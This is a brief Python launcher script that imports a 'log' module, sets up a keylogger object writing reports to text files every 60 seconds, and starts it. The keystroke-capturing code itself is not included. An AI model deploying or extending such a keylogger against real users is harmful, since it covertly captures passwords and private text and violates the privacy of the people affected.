import log

if __name__ == "__main__":
    keylog = log.Keylog(60) # the rate of which to create a report (txt file into the current directory)
    keylog.start() # starting the keylog